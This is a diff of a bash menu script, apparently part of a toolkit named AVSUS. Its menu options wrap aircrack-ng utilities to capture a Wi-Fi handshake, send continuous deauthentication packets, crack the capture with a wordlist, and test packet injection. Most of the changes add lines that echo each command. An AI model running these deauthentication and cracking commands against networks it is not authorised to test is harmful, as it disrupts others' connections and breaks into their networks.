     echo "__________________________________________________________________________________________________________"
     sudo airmon-ng
@@ -1072,20 +1498,31 @@ process_input() {
         32)
 	    default_interface="wlan0"
         read -p "[+] ENTER WHAT WILL BE THE NAME OF THE CAPTURE FILE: " nname
+        echo "[+] NAME OF CAP FILE ==> $nname"
         read -p "[+] ENTER THE CHANNEL OF WIFI: " channel
+        echo "[+] CHANNEL ==> $channel"
         read -p "[+] ENTER BSSID OF YOUR WIFI: " nbssid
+        echo "[+] BSSID ==> $nbssid"
         read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+        echo "[+] INTERFACE ==> $interface"
 	    interface=${interface:-$default_interface}
+        echo "[+] COMMAND ==> sudo airodump-ng -w $nname -c $channel --bssid $nbssid $interface "
         sudo airodump-ng -w $nname -c $channel --bssid $nbssid $interface
         ;;
         33)
         read -p "[+] ENTER BSSID OF YOUR WIFI: " bssid
+        echo "[+] BSSID ==> $bssid"
         read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+        echo "[+] WIFI INTERFACE ==> $interface"
+        echo "[+] COMMAND ==> sudo aireplay-ng --deauth 0 -a  $bssid $interface "
         sudo aireplay-ng --deauth 0 -a  $bssid $interface
         ;;
         22)
         read -p "[+] ENTER THE NAME OF WIFI CAPTURE FILE {.cap FILE}: " capfile
+        echo "[+] CAP FILE NAME ==> $capfile"
         read -p "[+] ENTER THE DESTINATION OR NAME OF WORDLIST TO CRACK: " wordlist
+        echo "[+] WORDLIST DESTINATION ==> $wordlist "
+        echo "[+] COMMAND ==> aircrack-ng $capfile -w $wordlist "
         aircrack-ng $capfile -w $wordlist
         ;;
         "pwd")
@@ -1098,9 +1535,11 @@ process_input() {
 	interface=${interface:-$default_interface}
 	read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
 	echo "[+] TESTING PACKET INJECTION" | lolcat
+    echo "[+] COMMAND ==> sudo aireplay-ng --test $interface "
 	sudo aireplay-ng --test $interface
 	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
 	echo "[+] MONITORING 5Ghz NETWORK NEAR YOU"
+    echo "[+] COMMAND ==> sudo airodump-ng --band a $interface "
 	sudo airodump-ng --band a $interface
         ;;
         "reboot")
@@ -1360,7 +1799,7 @@ or downloading a file from an untrusted source. Once malware is installed on a c
 	while :; do
 	  for (( i=0; i<${#chars}; i++ )); do
 	    sleep 0.1
-	    echo -en "\r [+] SHUTTING DOWN...${chars:$i:1}" | lolcat
+	    echo -en "\r    └[+] SHUTTING DOWN...${chars:$i:1}" | lolcat
 	    now=$(date +%s)
 	    elapsed=$((now-start))
 	    if [[ $elapsed -ge $timeout ]]; then
@@ -1393,8 +1832,16 @@ or downloading a file from an untrusted source. Once malware is installed on a c
     esac
 }
 while true; do
+  current_directory=$(pwd)
+  echo -e "\n\n"
+  echo -e "\033[34m┌──[$ AVSUS㉿$username]-[$current_directory]-[v2.8d]-[PRIMARY]\033[0m"
+  read -p "└──[$] " input 
+  process_input "$input"
+
+  # Check if the user changed directories
+  if [ "$current_directory" != "$old_directory" ]; then
+    old_directory="$current_directory"
     echo -e "\n\n"
-    echo -e "\033[34m┌──[$ AVSUS㉿$username]-[v2.1]\033[0m"
-    read -p "└──[$] " input 
-    process_input "$input"
+    echo -e "\033[34m┌──[$ AVSUS㉿$username]-[$current_directory]-[v2.8E]-[SECONDARY]\033[0m"
+  fi
 done
